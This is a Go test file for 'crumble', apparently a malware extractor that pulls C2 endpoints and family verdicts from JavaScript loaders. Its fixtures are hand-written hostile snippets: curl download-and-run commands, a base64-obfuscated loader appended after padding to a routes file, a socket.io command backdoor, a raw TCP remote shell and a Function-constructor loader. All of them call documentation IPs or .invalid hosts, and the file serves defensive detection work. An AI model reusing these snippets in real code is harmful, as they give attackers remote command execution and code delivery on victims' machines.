package extract

import (
	"strings"
	"testing"
	"time"
)

// Cases that came up running crumble over MalwareBazaar samples. The inputs
// are written by hand to reproduce the pattern; none is sample code.

func extractSrc(t *testing.T, src string, opts Options) *Report {
	t.Helper()
	if opts.Name == "" {
		opts.Name = "fixture.js"
	}
	opts.Budget = 30 * time.Second
	r, err := Extract([]byte(src), opts)
	if err != nil {
		t.Fatal(err)
	}
	return r
}

func hasNote(r *Report, sub string) bool {
	for _, n := range r.Notes {
		if strings.Contains(n, sub) {
			return true
		}
	}
	return false
}

func endpointRole(r *Report, url string) string {
	for _, e := range r.C2 {
		if e.URL == url {
			return e.Role + "/" + e.Source
		}
	}
	return ""
}

// The first OtterCookie loaders eval'd a field of a JSON response, and
// that response is what ends up uploaded as the sample.
func TestJSONEnvelope(t *testing.T) {
	r := extractSrc(t, `{"status":"ok","cookie":"require('child_process').exec('curl -Lo p.zi http://203.0.113.40:1224/pdown')"}`, Options{})
	if !hasNote(r, `field "cookie"`) {
		t.Errorf("notes = %v", r.Notes)
	}
	if got := endpointRole(r, "http://203.0.113.40:1224/pdown"); got != "download via shell/emulation" {
		t.Errorf("endpoint = %q, c2 = %+v", got, r.C2)
	}
	if !strings.Contains(r.Verdict, "BeaverTail") {
		t.Errorf("verdict = %q", r.Verdict)
	}
}

// Batch droppers get tagged with the family too.
func TestNotJavaScript(t *testing.T) {
	r := extractSrc(t, "@echo off\r\nset \"URL=http://203.0.113.41/api/package\"\r\ncurl -s -o \"%TEMP%\\x.js\" \"%URL%\"\r\n", Options{Name: "fixture.bat"})
	if r.Verdict != "not JavaScript; static indicators only" {
		t.Errorf("verdict = %q", r.Verdict)
	}
	if got := endpointRole(r, "http://203.0.113.41/api/package"); got != "static only/static" {
		t.Errorf("endpoint = %q", got)
	}
}

// BeaverTail pasted after the last line of a routes file.
func TestAppendedToHostFile(t *testing.T) {
	src := "module.exports = router;" + strings.Repeat(" ", 300) +
		`const h="aHR0cDovLzIwMy4wLjExMy40MjoxMjQ0";const u=Buffer.from(h,"base64").toString();` +
		`require("child_process").exec('curl -Lo "p.zi" "'+u+'/pdown"',()=>{});`
	r := extractSrc(t, src, Options{})
	if !hasNote(r, "(router)") {
		t.Errorf("notes = %v", r.Notes)
	}
	if got := endpointRole(r, "http://203.0.113.42:1244/pdown"); got != "download via shell/emulation" {
		t.Errorf("endpoint = %q, c2 = %+v", got, r.C2)
	}
	if !strings.Contains(r.Verdict, "BeaverTail") {
		t.Errorf("verdict = %q", r.Verdict)
	}
}

// OtterCookie's "command" handler runs exec after an await, by which time
// the next handler has been probed. Tasking must still go to "command".
func TestAsyncCommandHandler(t *testing.T) {
	src := `
		const io = require("socket.io-client");
		const { exec } = require("child_process");
		const socket = io("ws://203.0.113.43:8087", { reconnectionAttempts: 15 });
		socket.on("connect", () => socket.emit("processStatus", { up: true }));
		socket.on("command", async (msg) => {
			await Promise.resolve();
			await new Promise((r) => setTimeout(r, 10));
			exec(msg.message, (e, out) => socket.emit("message", { result: out }));
		});
		socket.on("processControl", (data) => socket.emit("processStatus", { got: true }));
	`
	r := extractSrc(t, src, Options{})
	if len(r.SocketIO) != 1 {
		t.Fatalf("socket.io = %+v", r.SocketIO)
	}
	s := r.SocketIO[0]
	if s.CommandEvent != "command" || !s.CommandExec || s.ReplyEvent != "message" {
		t.Errorf("tasking = %q -> %q (exec %v)", s.CommandEvent, s.ReplyEvent, s.CommandExec)
	}
}

func TestRawTCPShell(t *testing.T) {
	src := `
		const net = require("net");
		const os = require("os");
		const { execSync } = require("child_process");
		const HOST = "203.0.113.44", PORT = process.env.SERVER_PORT || 15152;
		let socket;
		function connect() {
			socket = new net.Socket();
			socket.setTimeout(360000);
			socket.on("connect", () => {
				socket.write(JSON.stringify({ status: "connected", message: os.platform() + "?" + os.hostname() }) + "\n");
			});
			socket.on("data", async (d) => {
				const cmd = d.toString().trim();
				if (cmd) socket.write(JSON.stringify({ status: "result", message: String(execSync(cmd)) }) + "\n");
			});
			socket.connect(PORT, HOST);
		}
		connect();
	`
	r := extractSrc(t, src, Options{})
	if r.Verdict != "Node.js remote shell over raw TCP, no family match" {
		t.Errorf("verdict = %q", r.Verdict)
	}
	if len(r.TCP) != 1 || r.TCP[0].URL != "tcp://203.0.113.44:15152" || !r.TCP[0].CommandExec {
		t.Fatalf("tcp = %+v", r.TCP)
	}
	if !strings.Contains(r.TCP[0].Hello, `"status":"connected"`) {
		t.Errorf("first write = %q", r.TCP[0].Hello)
	}
	if got := endpointRole(r, "tcp://203.0.113.44:15152"); got != "raw tcp/emulation" {
		t.Errorf("endpoint = %q", got)
	}
}

// Loaders that reach the Function constructor without writing "eval(".
func TestStaticLoaderViaFunctionConstructor(t *testing.T) {
	src := `
		const axios = require("axios");
		exports.check = (req, res) => {
			axios.get("http://api.token-check.invalid/api/service/token/1").then(() => {}).catch((err) => {
				const errCode = err.response.data;
				const handler = new (Function.constructor)("require", errCode);
				handler(require);
			});
		};
	`
	r := extractSrc(t, src, Options{NoEmulate: true})
	if !strings.Contains(r.Verdict, "loader") {
		t.Errorf("verdict = %q, roles = %+v", r.Verdict, r.Roles)
	}
}
